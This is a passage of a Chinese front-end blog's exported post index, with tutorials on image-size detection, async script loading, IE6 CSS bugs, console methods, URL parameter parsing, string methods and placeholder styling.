width:’+img.width+‘,height:’+img.height);&#125;;&#125;第一次执行，永远是onload触发你再刷新，几乎都是缓存触发了从缓存里读取图片的宽高不用说，非常方便快捷，今天我们要解决的是没有缓存而又快速的相比onload更快的方式去获取图片的宽高。我们常常知道有些图片虽然没有完全down下来，但是已经先有占位符，然后一点一点的加载。既然有占位符那应该是请求图片资源服务器响应后返回的。可服务器什么时候响应并返回宽高的数据没有触发事件，比如onload事件。于是催生了第四种方法四、通过定时循环检测获取看看以下例子，为了避免从缓存里读取数据，每一次请求都带时间戳：123456789101112131415161718192021// 图片地址var img_url = ‘http://www.qttc.net/static/upload/2013/13643608813441.jpg?’+Date.parse(new Date());// 创建对象var img = new Image();// 改变图片的srcimg.src = img_url;// 定时执行获取宽高var check = function()&#123;document.body.innerHTML += ‘from:check : width:‘+img.width+’,height:‘+img.height+’‘;&#125;;var set = setInterval(check,40);// 加载完成获取宽高img.onload = function()&#123;document.body.innerHTML += ‘from:onload : width:‘+img.width+’,height:‘+img.height+’‘;// 取消定时获取宽高clearInterval(set);&#125;;FireFoxIE7 8 9 10Chrome通过以上测试，我们发现定时检测图片宽高的方式要比onload快多了，打印的行数越多表示onload时间越长，40毫秒执行一次，基本100毫秒内就能获取图片的宽高，chrome甚至在第一次循环的时候就已经获得数据。从以上数据来分析，其实我们可以在定时函数里判断只要图片的宽高都大于0就表示已经获得正确的图片宽高。我们把时间打上，来看看通过定时获取宽高或者onload获取宽高所需要多少时间。1234567891011121314151617181920212223242526// 记录当前时间戳var start_time = new Date().getTime();// 图片地址var img_url = ‘http://b.zol-img.com.cn/desk/bizhi/image/2/2560×1600/1365477614755.jpg?’+start_time;// 创建对象var img = new Image();// 改变图片的srcimg.src = img_url;// 定时执行获取宽高var check = function()&#123;// 只要任何一方大于0// 表示已经服务器已经返回宽高if(img.width&gt;0 || img.height&gt;0)&#123;var diff = new Date().getTime() - start_time;document.body.innerHTML += ‘from:check : width:‘+img.width+’,height:‘+img.height+’, time:‘+diff+’ms‘;clearInterval(set);&#125;&#125;;var set = setInterval(check,40);// 加载完成获取宽高img.onload = function()&#123;var diff = new Date().getTime() - start_time;document.body.innerHTML += ‘from:onload : width:’+img.width+‘,height:’+img.height+‘, time:’+diff+‘ms’;&#125;;FireFox：IEChrome这是一张2560 * 1600大小的图片，各浏览器执行结果都能看到通过快速获取图片大小的方法几乎都在200毫秒以内，而onload至少五秒以上，这差别之大说明快速获取图片宽高非常实用。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js快速获取图片宽高</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js异步加载技术 JavaScript技术提高]]></title>
    <url>%2F2015%2F07%2F31%2Fjs%E5%BC%82%E6%AD%A5%E5%8A%A0%E8%BD%BD%E6%8A%80%E6%9C%AF-javascript%E6%8A%80%E6%9C%AF%E6%8F%90%E9%AB%98%2F</url>
    <content type="text"><![CDATA[默认情况下，js是默认同步加载的也就是是JS的加载时是阻塞的，后面的元素要等待js加载完成之后加载，那么对于一些无意义的javascript，如果放在头部会导致加载速度很慢，那么会影响用户体验，那么如何解决这种情况呢？（1）defer,但只支持IE，代码如下：123&lt;script type=”text/javascript” defer=”defer”&gt;alert(document.getElementById(“p1″).children[0]);&lt;/script&gt;(2),async，这种方法是html5属性，这种方式只能用于外部js代码如下1&lt;script type=”text/javascript” async=”async”&gt;&lt;/script&gt;(3).创建script，插入到dom中，加载完成后回调，代码如下12345678910111213141516171819202122232425262728function loadScript(url,callback)&#123;var script=document.createElement(‘script’);script.type=”text/javascript”;//**IE**if(script.readyState)&#123;script.onreadystatechange=function()&#123;if(script.readyState==”loaded”||script.readyState==”complete”)&#123;script.onreadystatechange=null;callback();&#125;&#125;&#125;else&#123;script.onload=function()&#123;callback();&#125;&#125;script.src=url;document.body.appendChild(script);&#125;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>JavaScript技术提高</tag>
        <tag>js异步加载技术</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IE6常见bug]]></title>
    <url>%2F2015%2F07%2F31%2Fie6%E5%B8%B8%E8%A7%81bug%2F</url>
    <content type="text"><![CDATA[1、IE6怪异解析之padding与border算入宽高原因：未加文档声明造成非盒模型解析解决方法：加入文档声明&lt;!doctype html&gt;2、IE6在块元素、左右浮动、设定marin时造成margin双倍（双边距）解决方法：display:inline3、以下三种其实是同一种bug，其实也不算是个bug，举个例子：父标签高度20，子标签11，垂直居中，20-11=9，9要分给文字的上面与下面，怎么分？IE6就会与其它的不同，所以，尽量避免。1）字体大小为奇数之边框高度少1px解决方法：字体大小设置为偶数或line-height为偶数2）line-height，文本垂直居中差1px解决方法：padding-top代替line-height居中，或line-height加1或减13）与父标签的宽度的奇偶不同的居中造成1px的偏离解决方法：如果父标签是奇数宽度，则子标签也用奇数宽度;如果是父标签偶数宽度，则子标签也用偶数宽度4、内部盒模型超出父级时，父级被撑大解决方法：父标签使用overflow:hidden;5、line-height默认行高bug解决方法：line-height设值6、行标签之间会有一小段空白解决方法：float或结构并排(可读性差，不建议)7、标签高度无法小于19px解决方法：overflow: hidden;8、左浮元素margin-bottom失效解决方法：显示设置高度 or 父标签设置_padding-bottom代替子标签的margin-bottom or 再放个标签让父标签浮动，子标签margin- bottom，即(margin-bottom与float不同时作用于一个标签)9、img于块元素中，底边多出空白解决方法：父级设置overflow: hidden; 或 img { display: block; } 或 _margin: -5px;10、li之间会有间距解决方法：float: left;11、块元素中有文字及右浮动的行元素，行元素换行解决方法：将行元素置于块元素内的文字前12、position下的left，bottom错位解决方法：为父级(relative层)设置宽高或添加*zoom:1;13、子级中有设置position，则父级overflow失效解决方法：为父级设置position:relative;]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>IE6常见bug</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS判断鼠标从什么方向进入一个容器]]></title>
    <url>%2F2015%2F07%2F31%2Fjs%E5%88%A4%E6%96%AD%E9%BC%A0%E6%A0%87%E4%BB%8E%E4%BB%80%E4%B9%88%E6%96%B9%E5%90%91%E8%BF%9B%E5%85%A5%E4%B8%80%E4%B8%AA%E5%AE%B9%E5%99%A8%2F</url>
    <content type="text"><![CDATA[基于jquery：12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=”UTF-8″&gt;&lt;title&gt;判断鼠标进入方向&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;style&gt;html,body&#123;margin:0;padding:0;&#125;#wrap&#123;width:300px;height:300px;background:#33aa00;margin:50px;display:inline-block;font-size:50px;text-align:center;line-height:300px;&#125;&lt;/style&gt;&lt;div id=”wrap”&gt;方向反馈&lt;/div&gt;&lt;script type=”text/javascript” src=”http://ajax.microsoft.com/ajax/jquery/jquery-1.4.min.js”&gt;&lt;/script&gt;&lt;script&gt;$(“# wrap”).bind(“mouseenter mouseleave”, function(e) &#123; var w = $(this).width(); var h = $(this).height(); var x = (e.pageX– this.offsetLeft–(w / 2)) * (w &gt; h ? (h / w) : 1); var y = (e.pageY– this.offsetTop–(h / 2)) * (h &gt; w ? (w / h) : 1); var direction = Math.round((((Math.atan2(y, x) * (180 / Math.PI)) + 180) / 90) + 3) % 4; var eventType = e.type; var dirName = new Array(‘上方’, ’右侧’, ’下方’, ’左侧’); if (e.type == ‘mouseenter’) &#123; $(this).html(dirName[direction] + ’进入’); &#125; else &#123; $(this).html(dirName[direction] + ’离开’); &#125; &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&nbsp;上面代码是基于jquery的，原生js如下：12345678910111213141516171819202122var wrap = document.getElementById(‘wrap’);var hoverDir = function(e) &#123; var w = wrap.offsetWidth; var h = wrap.offsetHeight; var x = (e.clientX– wrap.offsetLeft–(w / 2)) * (w &gt; h ? (h / w) : 1); var y = (e.clientY– wrap.offsetTop–(h / 2)) * (h &gt; w ? (w / h) : 1); var direction = Math.round((((Math.atan2(y, x) * (180 / Math.PI)) + 180) / 90) + 3) % 4; var eventType = e.type; var dirName = new Array(‘上方’, ’右侧’, ’下方’, ’左侧’); if (e.type == ‘mouseover’ || e.type == ‘mouseenter’) &#123; wrap.innerHTML = dirName[direction] + ’进入 '; &#125; else &#123; wrap.innerHTML = dirName[direction] + ’离开 '; &#125;&#125;if (window.addEventListener) &#123; wrap.addEventListener(‘mouseover’, hoverDir, false); wrap.addEventListener(‘mouseout’, hoverDir, false);&#125; else if (window.attachEvent) &#123; wrap.attachEvent(‘onmouseenter’, hoverDir); wrap.attachEvent(‘onmouseleave’, hoverDir);&#125;&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>JS判断鼠标方向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为网站提速 探秘HTML 5链接预取功能]]></title>
    <url>%2F2015%2F07%2F31%2F%E4%B8%BA%E7%BD%91%E7%AB%99%E6%8F%90%E9%80%9F-%E6%8E%A2%E7%A7%98html-5%E9%93%BE%E6%8E%A5%E9%A2%84%E5%8F%96%E5%8A%9F%E8%83%BD%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;HTML 5的链接预取功能(link prefetching)是一个埋在沙里的宝石，至今还很少人知道它的价值。你可能已经知道了那古老而又闻名的图片预加载功能，链接预取功能就是将此概念由图片扩展到了网页内容(不需要任何AJAX代码)。&emsp;&emsp;它是这样工作的，在页面上添加一个像这样的链接：rel="next" href="page2.html">```123456789101112这样，当你的机器空闲时，浏览器就会自动的在后台把page2.html下载下来。 当用户最终点击了page2.html的链接时，浏览器会从缓存里把这个页面取出来，所以这个页面的加载速度会出乎意料的快。&amp;emsp;&amp;emsp;目前只有火狐浏览器支持这个功能。但是因为火狐目前是世界上拥有第二大用户群的浏览器，所以只要你在HTML页面了加上这样的一句代码，仍有相当大的一部分访问者能体验到这十分明显的页面加载速度的提高。你可以在许多情况下可以使用链接预取功能：◆当你有一篇篇幅很长的文章，或在线教程，或图册等，需要分成多页显示时。◆在你的网站首页预加载那些用户最可能访问的下一页。(可能是一个商品网站上“重点推荐”商品页面，或博客网站上最近的一篇博客)◆搜索查询页面预加载搜索出来的前几条。&amp;emsp;&amp;emsp;对于静态的内容你还可以使用rel标记实现预取功能：```&lt;link rel=&quot;prefetch&quot; href=&quot;/images/big.jpeg&quot;&gt;这里还有其它一些有趣的事需要注意：◆链接预取功能不久将会在Opera, Chrome 和 Safari 浏览器里实现，但对于Internet Explorer，你估计要等到2020年。◆如果这种功能被广泛的使用，它会影响你的网站日志和访问统计。请考虑这样的情况，你的一个页面预存取了好几个页面，可用户实际上没有访问到这几个页面。 你的服务器(或统计工具)并不知道这两者之间的区别。&emsp;&emsp;为了分清这个，Firefox会在HTTP头信息里发送X-moz: prefetch信息，但你需要在服务器端有什么东西能识别这种信息。]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>HTML5预取功能</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[详解console的高级应用]]></title>
    <url>%2F2015%2F07%2F29%2F%E8%AF%A6%E8%A7%A3console%E7%9A%84%E9%AB%98%E7%BA%A7%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;对于前端开发者来说，在开发过程中需要监控某些表达式或变量的值的时候，用 debugger 会显得过于笨重，取而代之则是会将值输出到控制台上方便调试。最常用的语句就是console.log(expression)了。&emsp;&emsp;然而对于作为一个全局对象的console对象来说，大多数人了解得还并不全面，当然我也是，经过我的一番学习，现在对于这个能玩转控制台的 JS 对象有了一定的认识，想与大家分享一下。&emsp;&emsp;console 对象除了console.log()这一最常被开发者使用的方法之外，还有很多其他的方法。灵活运用这些方法，可以给开发过程增添许多便利。console 的方法console.assert(expression, object[, object…])&emsp;&emsp;接收至少两个参数，第一个参数的值或返回值为false的时候，将会在控制台上输出后续参数的值。例如：12console.assert(1 == 1, object); // 无输出，返回 undefinedconsole.assert(1 == 2, object); // 输出 objectconsole.count([label])输出执行到该行的次数，可选参数 label 可以输出在次数之前，例如：12345678910(function() &#123;for (var i = 0; i &lt; 5; i++) &#123;console.count('count');&#125;&#125;)();// count: 1// count: 2// count: 3// count: 4// count: 5console.dir(object)将传入对象的属性，包括子对象的属性以列表形式输出，例如：123456var obj = &#123;name: 'classicemi',college: 'HUST',major: 'ei'&#125;;console.dir(obj);输出：&nbsp;console.error(object[, object…])&emsp;&emsp;用于输出错误信息，用法和常见的console.log一样，不同点在于输出内容会标记为错误的样式，便于分辨。输出结果：console.group&emsp;&emsp;这是个有趣的方法，它能够让控制台输出的语句产生不同的层级嵌套关系，每一个console.group()会增加一层嵌套，相反要减少一层嵌套可以使用console.groupEnd()方法。语言表述比较无力，看代码：12345678910console.log('这是第一层');console.group();console.log('这是第二层');console.log('依然第二层');console.group();console.log('第三层了');console.groupEnd();console.log('回到第二层');console.groupEnd();console.log('回到第一层');输出结果：和console.group()相似的方法是console.groupCollapsed()作用相同，不同点是嵌套的输出内容是折叠状态，在有大段内容输出的时候使用这个方法可以使输出版面不至于太长。。。吧console.info(object[, object…])此方法与之前说到的console.error一样，用于输出信息，没有什么特别之处。1console.info('info'); // 输出 infoconsole.table()&emsp;可将传入的对象，或数组以表格形式输出，相比传统树形输出，这种输出方案更适合内部元素排列整齐的对象或数组，不然可能会出现很多的 undefined。123456789101112131415161718var obj = &#123;foo: &#123;name: 'foo',age: '33'&#125;,bar: &#123;name: 'bar',age: '45'&#125;&#125;;var arr = [['foo', '33'],['bar', '45']];console.table(obj);console.table(arr);也可以console.log(object[, object…])这个不用多说，这个应该是开发者最常用的吧，也不知道是谁规定的。。。1console.log('log'); // 输出 logconsole.profile([profileLabel])&emsp;这是个挺高大上的东西，可用于性能分析。在 JS 开发中，我们常常要评估段代码或是某个函数的性能。在函数中手动打印时间固然可以，但显得不够灵活而且有误差。借助控制台以及console.profile()方法我们可以很方便地监控运行性能。例如下面这段代码：12345678910111213function parent() &#123;for (var i = 0; i &lt; 10000; i++) &#123;childA()&#125;&#125;function childA(j) &#123;for (var i = 0; i &lt; j; i++) &#123;&#125;&#125;console.profile('性能分析');parent();console.profileEnd();然后我们可以在 Profiles 面板下看到上述代码运行过程中的消耗时间。&emsp;&emsp;页面加载过程的性能优化是前端开发的一个重要部分，使用控制台的 profiles 面板可以监控所有 JS 的运行情况使用方法就像录像机一样，控制台会把运行过程录制下来。如图，工具栏上有录制和停止按钮。录制结果：console.time(name)&emsp;&emsp;计时器，可以将成对的console.time()和console.timeEnd()之间代码的运行时间输出到控制台上，name参数可作为标签名。12345console.time('计时器');for (var i = 0; i &lt; 1000; i++) &#123;for (var j = 0; j &lt; 1000; j++) &#123;&#125;&#125;console.timeEnd('计时器');（刚才实际多写了一层循环，结果电脑风扇呜呜转啊，浏览器直接无响应了。。。）console.trace()&emsp;&emsp;console.trace()用来追踪函数的调用过程。在大型项目尤其是框架开发中，函数的调用轨迹可以十分复杂，console.trace()方法可以将函数的被调用过程清楚地输出到控制台上。1234567891011121314function tracer(a) &#123;console.trace();return a;&#125;function foo(a) &#123;return bar(a);&#125;function bar(a) &#123;return tracer(a);&#125;var a = foo('tracer');输出：console.warn(object[, object…])输出参数的内容，作为警告提示。1console.warn('warn'); // 输出 warn占位符&emsp;&emsp;console对象上的五个直接输出方法，console.log(),console.warn(),console.error(),console.exception()(等同于console.error())和console.info()，都可以使用占位符。支持的占位符有四种，分别是字符(%s)、整数(%d 或%i)、浮点数(%f)和对象(%o)。1234567console.log('%s是%d年%d月%d日', '今天', 2014, 4, 15);console.log('圆周率是%f', 3.14159);var obj = &#123;name: 'classicemi'&#125;console.log('%o', obj);&emsp;&emsp;还有一种特殊的标示符%c，对输出的文字可以附加特殊的样式，当进行大型项目开发的时候，代码中可能有很多其他开发者添加的控制台语句。开发者对自己的输出定制特别的样式就可以方便自己在眼花缭乱的输出结果中一眼看到自己需要的内容。想象力丰富的童鞋也可以做出有创意的输出信息，比如常见的招聘信息和个人介绍啥的。输出结果：1console.log('%cMy name is classicemi.', 'color: #fff; background: #f40; font-size: 24px;');==标示符可以用各种 CSS==&emsp;&emsp;语句来为输出添加样式，再随便举个栗子，background属性的url()中添加图片路径就可以实现图片的输出了，各位前端童鞋快施展你们的 CSS 神技来把控制台玩坏吧~~]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>console</tag>
        <tag>console.log</tag>
        <tag>console高级应用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[语义化你的JavaScript代码]]></title>
    <url>%2F2015%2F07%2F28%2F%E8%AF%AD%E4%B9%89%E5%8C%96%E4%BD%A0%E7%9A%84javascript%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[语义化这个词在 HTML中用的比较多，即根据内容的结构化选择合适的标签。其作用不容小觑：赋予标签含义，让代码结构更加清晰，虽然我们可以在标签上添加 class 来标识，但这种通过属性来表示本体的形式会显得不够直接，而且在一定程度上也有冗余。优化搜索引擎（SEO），结构良好的网页对搜索引擎的亲和力是很高的，百度和 google 也给出了很多网页结构化的建议（规范），方便他们抓取网页。利于设备解析，如盲人阅读器对页面的分析，目前淘宝很多网页都是支持盲人阅读的，这种体验上的优化得利于网页的良好结构和语义化表达。便于开发者维护，在参加工作之前，很多程序员都是单人开发模式，单人开发无所谓代码结构，自己看得懂就差不多了，一旦走向工作岗位，会发现，以前的鄙习有点让自己捉襟见肘了。&nbsp;W3C Group 工作组在 web 规范上持续贡献，他们的目标也是期望整个互联网的发展态势稳定统一起来。不扯远了，回到本文需要阐述的重点：如何语义化 JavaScript 代码？一、先看看那些不易读懂的 JavaScript 代码1. 判断123456789// 数据类型判断if(Object.prototype.toString.call(str) === “[object String]”)&#123;// doSomething();&#125;；// 文件类型判断if(/.*\.css(?=\?|$)/.test(“/path/to/main.css”))&#123;// doSomething();&#125;2. 清空一个队列1234var Queue = ["test1", "test2", "test3"];// 常见方式Queue.length = 0;Queue = [];3.注册一个变量123456789101112//注册var repos = &#123;&#125;;repos[“a”] = &#123;name: “a”,content: &#123;&#125;&#125;;repos[“b”] = &#123;name: “b”,content: &#123;&#125;&#125;;&emsp;&emsp;上面几个例子倒不至于看不懂，程序都特别简单，第一个例子中，我们通过 Object 原型链上的 toString 方法来判断一个变量是否为 string 类型，以及使用正则来判断一个文件是不是 css 文件。代码写起来比较轻松，倘若我们同时需要判断多个对象是否为多个类型中的一种呢？再比如我们需要在一串代码中提取 require 依赖关系呢，是否应该思考下如何组织自己的代码？&emsp;&emsp;在第二个例子中，将数组的长度设置为 0，或者使用空数组来重置这个变量，都是十分常见的方式，但目前的场景是清空一个队列，我们是否可以使用更加语义化的形式来呈现？比如我们只需要清空该队列的前五个和后三个 item 呢？&emsp;&emsp;第三个例子中，变量的注册，把一堆注册放在一起，上面的形式确实也是一目了然，如果 a b c d 等都是分隔穿插在几百行代码之间呢？突然来个 repos[“x”] 这样是否显得有些不太直观。&emsp;&emsp;为了说明本文所倡导的思想，上面的几个解释都有些含糊和牵强，请往下看。&nbsp;二、提高代码语义性针对上述三个案例，用更加语义化的方式来呈现代码：1. 语义化变量1234567891011121314// 类型判断function isType(type)&#123;return function(o)&#123;return Object.prototype.toString.call(o) === '[object ' + type + ']';&#125;&#125;var isString = isType(“String”);var isObject = isType("Object");var isArray = isType("Array");isString("I'm Barret Lee.");isArray([1,2,3])；isObject(&#123;&#125;);我觉得不需要太多的解释，对比123if(Object.prototype.toString.call(str) === “[object String]”)&#123;// code here...&#125;显得清新多了吧。123// 提取常量var isCss = /.*\.css(?=\?|$)/;isCss.test(“/path/to/main.css”);不管 isCss 这个正则代码有多长，当我们看到 isCss 这个单词就可以顾名思义。很多人写正则都不会将正则单独提取出来使用某个有意义的变量去存储，加注释还好，要是不加注释，后续开发者就只能硬着头皮看懂正则去理解代码的含义。这样的处理，实际上是增加了代码量，不过从工程角度去审视，有助于提高开发效率以及代码的组织性。2. 语义化行为12var Queue = ["test1", "test2", "test3"];Queue.splice(0, Queue.length);上面代码具有很强的语义性，从索引为 0 的地方开始，直到队列最后，删除 Queue 中所有的 item。这种写法的扩展性也更好：4);删除从索引为 2，往后的 4 个元素```12345678910111213这只是个小例子，有些行为是需要很多代码组合处理的，如果没有很好的组合同一行为的代码，整个结构就显得十分涣散，不利于阅读。```javascript// 注册var repos = [];function register(o)&#123;repos[o.name] = o;&#125;register(&#123;name: “a”,content: &#123;&#125;&#125;);对比我们之前1234repos[“a”] = &#123;name: “a”,content: &#123;&#125;&#125;;语义化程度是不是有所提高~三、小结代码的优化，需要考虑的维度很多。但是代码的优化并不是减少代码量，有的时候我们需要增加代码来提高代码的可阅读性。正确标记变量封装某个动作注意函数的写法不容易理解的东西，加注释&nbsp;本文为抛砖引玉，希望可以触发你对代码优化的敏感度的思考，写出一手别人竖拇指的代码~]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>语义化javascript</tag>
        <tag>语义化js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jquery ajax异步调用方法中不能给全局变量赋值的原因及解决方法]]></title>
    <url>%2F2015%2F07%2F27%2Fjquery-ajax%E5%BC%82%E6%AD%A5%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E4%B8%AD%E4%B8%8D%E8%83%BD%E7%BB%99%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC%E7%9A%84%E5%8E%9F%E5%9B%A0%E5%8F%8A%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[在调用一个jquery的ajax方法时我们有时会需要该方法返回一个值或者给某个全局变量赋值，可是我们发现程序执行完后并没有获取到我们想要的值，这时很有可能是因为你用的是ajax的异步调用async:true(默认情况),如：12345678910111213function ManageCommentText(text) &#123;var result = text;$.ajax(&#123;data: "get",url: "GetComments.aspx",data: "type=getText&amp;amp;commentText=" + text,cache: false,async: false,success: function (data) &#123;result = data;&#125;&#125;)return result;以上方法是ajax的同步调用，只有在获取到了data值并赋值给result以后才会返回result完成该方法的调用。若设为async:true,则会未等到获取data值就已经返回了result。另一个解决办法就是将你的代码直接写到success方法里。（根据你的业务并不是所有的都可以直接写到success里的）。注意：如果设定为 async: false,就失去 ajax异步的优点了哦。&nbsp;&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>ajax 全局变量赋值</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用JS获取地址栏参数的方法]]></title>
    <url>%2F2015%2F07%2F27%2F%E7%94%A8js%E8%8E%B7%E5%8F%96%E5%9C%B0%E5%9D%80%E6%A0%8F%E5%8F%82%E6%95%B0%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[方法一：采用正则表达式获取地址栏参数：（ 强烈推荐，既实用又方便！）1234567891011function GetQueryString(name)&#123;var reg = new RegExp("(^|&amp;amp;)"+ name +"=([^&amp;amp;]*)(&amp;amp;|$)");var r = window.location.search.substr(1).match(reg);if(r!=null)return unescape(r[2]); return null;&#125;// 调用方法alert(GetQueryString("参数名1"));alert(GetQueryString("参数名2"));alert(GetQueryString("参数名3"));下面举一个例子:若地址栏URL为：abc.html?id=123&amp;url=http://www.npm8.com那么，但你用上面的方法去调用：alert(GetQueryString(“url”));则会弹出一个对话框：内容就是 http://www.npm8.com如果用：alert(GetQueryString(“id”));那么弹出的内容就是 123 啦；当然如果你没有传参数的话，比如你的地址是 abc.html 后面没有参数，那强行输出调用结果有的时候会报错：所以我们要加一个判断 ，判断我们请求的参数是否为空，首先把值赋给一个变量：12345var myurl=GetQueryString("url");if(myurl !=null &amp;amp;&amp;amp; myurl.toString().length&gt;1)&#123;alert(GetQueryString("url"));&#125;这样就不会报错了！方法二：传统方法123456789101112131415161718192021&lt;script type="text/javascript"&gt;function UrlSearch()&#123;var name,value;var str=location.href; //取得整个地址栏var num=str.indexOf("?")str=str.substr(num+1); //取得所有参数 stringvar.substr(start [, length ]var arr=str.split("&amp;amp;"); //各个参数放到数组里for(var i=0;i &lt; arr.length;i++)&#123;num=arr[i].indexOf("=");if(num&gt;0)&#123;name=arr[i].substring(0,num);value=arr[i].substr(num+1);this[name]=value;&#125;&#125;&#125;var Request=new UrlSearch(); //实例化alert(Request.id);&lt;/script&gt;比如说把这个代码存为1.html那么我要访问1.html?id=test这个时候就取到test的值了在html里调用12345678910&lt;script type="text/javascript"&gt;var a="http://baidu.com";&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;a id="a1" href=""&gt;sadfsdfas&lt;/a&gt;&lt;script&gt;var a1=document.getElementById("a1");a1.href=a;&lt;/script&gt;12345&lt;script type="text/javascript"&gt;var a="http://xxx.com/gg.htm?cctv";var s=a.indexOf("?");var t=a.substring(s+1);// t就是?后面的东西了&lt;/script&gt;stringvar.substr(start [, length ]返回一个从指定位置开始的指定长度的子字符串。stringvar必选项。要提取子字符串的字符串文字或 String 对象。start必选项。所需的子字符串的起始位置。字符串中的第一个字符的索引为 0。length可选项。在返回的子字符串中应包括的字符个数。如果 length 为 0 或负数，将返回一个空字符串。如果没有指定该参数，则子字符串将延续到 stringvar 的最后。下面列举出一些相关的参数：str.toLowerCase() 转换成小写str.toUpperCase() 字符串全部转换成大写URL即:统一资源定位符 (Uniform Resource Locator, URL)完整的URL由这几个部分构成：scheme://host:port/path?query#fragmentscheme:通信协议常用的http,ftp,maito等host:主机服务器(计算机)域名系统 (DNS) 主机名或 IP 地址。port:端口号整数，可选，省略时使用方案的默认端口，如http的默认端口为80。path:路径由零或多个”/“符号隔开的字符串，一般用来表示主机上的一个目录或文件地址。query:查询可选，用于给动态网页（如使用CGI、ISAPI、PHP/JSP/ASP/ASP.NET等技术制作的网页）传递参数，可有多个参数，用”&amp;”符号隔开，每个参数的名和值用”=”符号隔开。fragment:信息片断字符串，用于指定网络资源中的片断。例如一个网页中有多个名词解释，可使用fragment直接定位到某一名词解释。(也称为锚点.)对于这样一个URLhttp://www.npm8.com/index.html?ver=1.0&amp;id=6#imhere我们可以用javascript获得其中的各个部分1, window.location.href整个URl字符串(在浏览器中就是完整的地址栏)本例返回值: http://www.grycheng.com/index.html?ver=1.0&amp;id=6#imhere2,window.location.protocolURL 的协议部分本例返回值:http:3,window.location.hostURL 的主机部分本例返回值:www.maidq.com4,window.location.portURL 的端口部分如果采用默认的80端口(update:即使添加了:80)，那么返回值并不是默认的80而是空字符本例返回值:””5,window.location.pathnameURL 的路径部分(就是文件地址)本例返回值:/fisker/post/0703/window.location.html6,window.location.search查询(参数)部分除了给动态语言赋值以外，我们同样可以给静态页面,并使用javascript来获得相信应的参数值本例返回值:?ver=1.0&amp;id=67,window.location.hash锚点本例返回值:#imhere]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>JS获取地址栏参数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[slice,substr和substring的区别]]></title>
    <url>%2F2015%2F07%2F26%2Fslicesubstr%E5%92%8Csubstring%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[首先，slice，substring及substr返回被操作字符串的一个子串，对原始字符串没有任何影响，同时都接受一个或者两个参数。第一个参数指定子串的起始位置，在第二个参数指定的情况下，slice和substring方法表示子串的结束位置(不包括结束位置)，而substr方法则是返回的字符个数。若第二个参数没有指定，则默认为字符串的长度。例子如下：12345678var test = "hello world";console.log(test.slice(4,7)); //o wconsole.log(test.substring(4,7)); //o wconsole.log(test.substr(4,7)); //o worldconsole.log(test.substr(4)); //o worldconsole.log(test.substring(4)); //o worldconsole.log(test.substr(4)); //o world这里需要注意的是：substring是以两个参数中较小一个作为起始位置，较大的参数作为结束位置。如：1console.log(test.substring(7,4)); //o w当接收的参数是负数时，slice会将它字符串的长度与对应的负数相加，结果作为参数；substr是第一个参数为负的话，与字符串长度相加然后作为第一个参数，而第二个为负的参数，则转换为0作为第二个参数；substring则干脆将负参数都直接转换为0。1234567var test = 'hello world';console.log(test.slice(-3)); //rld 相当于console.log(test.slice(8));console.log(test.substring(-3)); //hello world 相当于console.log(test.substring(0));console.log(test.substr(-3)); //rld 相当于console.log(test.substr(8));console.log(test.slice(3,-4)); //lo w 相当于console.log(test.slice(3，7));console.log(test.substring(3,-4)); //hel 相当于console.log(test.substring(3，0));console.log(test.substr(3,-4)); //空字符串 相当于console.log(test.substr(3，0));&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>slice</tag>
        <tag>slice substr substring的区别</tag>
        <tag>substr</tag>
        <tag>substring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何改变placeholder中字的颜色]]></title>
    <url>%2F2015%2F07%2F26%2F%E5%A6%82%E4%BD%95%E6%94%B9%E5%8F%98placeholder%E4%B8%AD%E5%AD%97%E7%9A%84%E9%A2%9C%E8%89%B2%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;placeholder属性是css3中新增加的属性，IE9和Opera12以下版本的CSS选择器均不支持占位文本.因为每个浏览器的CSS选择器都有所差异，所以需要针对每个浏览器做单独的设定(可以在冒号前面写input和textarea)。123456789101112131415::-webkit-input-placeholder &#123; /* WebKit browsers */ color:#999; &#125; :-moz-placeholder &#123; /* Mozilla Firefox 4 to 18 */ color:#999; &#125; ::-moz-placeholder &#123; /* Mozilla Firefox 19+ */ color:#999; &#125; :-ms-input-placeholder &#123; /* Internet Explorer 10+ */ color:#999; &#125;还可以写成下面这样：123456789101112131415input::-webkit-input-placeholder, textarea::-webkit-input-placeholder &#123; color: #666; &#125; input:-moz-placeholder, textarea:-moz-placeholder &#123; color:#666; &#125; input::-moz-placeholder, 